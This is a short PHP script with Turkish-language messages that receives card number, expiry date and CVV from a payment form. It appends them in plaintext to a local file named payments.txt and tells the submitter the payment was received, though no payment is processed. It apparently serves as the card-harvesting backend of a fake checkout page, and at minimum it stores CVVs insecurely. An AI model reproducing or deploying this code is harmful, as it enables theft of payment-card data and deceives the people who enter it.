<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $card_number = htmlspecialchars($_POST['card_number']);
    $expiry_date = htmlspecialchars($_POST['expiry_date']);
    $cvv = htmlspecialchars($_POST['cvv']);

    // Bilgileri dosyaya kaydet
    $file = fopen("payments.txt", "a");
    $data = "Card Number: " . $card_number . ", Expiry Date: " . $expiry_date . ", CVV: " . $cvv . "\n";
    fwrite($file, $data);
    fclose($file);

    echo "<div style='text-align:center;margin-top:20px;font-family:Arial,sans-serif;'>
            <h2>Ödemeniz alındı!</h2>
            <p>Ödeme bilgileri başarıyla kaydedildi.</p>
          </div>";
} else {
    echo "<div style='text-align:center;margin-top:20px;font-family:Arial,sans-serif;'>
            <h2>Geçersiz istek.</h2>
            <p>Lütfen ödeme formunu doldurarak tekrar deneyin.</p>
          </div>";
}
?>
